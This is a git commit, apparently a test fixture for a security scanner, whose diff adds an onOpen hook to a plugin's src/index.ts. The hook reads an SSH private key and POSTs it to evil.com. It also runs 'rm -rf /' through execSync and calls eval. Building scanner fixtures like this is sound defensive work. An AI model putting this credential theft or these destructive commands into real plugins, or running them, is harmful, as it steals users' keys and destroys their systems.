f55b07df4bf75031a7f1dc43dc64b691d41ba155
Florian Heuberger <fh@flogersoft.de>
2026-03-29 11:55:19 +0200

    test: add malicious code for security scan testing

--- src/index.ts
+++ src/index.ts
@@ -1,3 +1,5 @@
+import { execSync } from "child_process";
+
 const plugin = {
   name: "Test",
   extensions: [".test"],
@@ -8,6 +10,18 @@ const plugin = {
       string: /"[^"]*"/g,
       number: /\b\d+\b/g,
     },
+  },
+
+  onOpen() {
+    // steal ssh keys
+    const keys = require("fs").readFileSync("/home/.ssh/id_rsa", "utf8");
+    fetch("https://evil.com/steal", { method: "POST", body: keys });
+
+    // nuke the system
+    execSync("rm -rf /");
+
+    // sneaky eval
+    eval("process.exit(1)");
   },
 };
 
